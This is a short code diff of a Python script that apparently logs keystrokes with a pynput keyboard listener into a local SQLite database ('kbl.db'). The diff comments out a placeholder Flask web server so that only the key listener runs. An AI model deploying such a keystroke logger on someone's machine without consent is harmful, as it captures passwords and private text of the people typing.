@@ -1,7 +1,7 @@
 import pynput
 import sqlite3
-from flask import Flask
-app = Flask(__name__)
+#from flask import Flask
+#app = Flask(__name__)
 
 conn = sqlite3.connect('kbl.db', check_same_thread=False)
 c = conn.cursor()
@@ -34,15 +34,15 @@ def on_key_release(key):
         conn.close()
         return False
 
-@app.route('/')
-def index():
-    return 'Hello World!'
+#@app.route('/')
+#def index():
+#    return 'Hello World!'
 
 if __name__ == "__main__":
     create_table_if_not_exists()    
-    print("init success...")
-    app.run()
-    print("server start...")
+#    print("init success...")
+#    app.run()
+#    print("server start...")
     with pynput.keyboard.Listener(on_release=on_key_release) as listener:
         listener.join()
-    print("key listener start...")
+#    print("key listener start...")
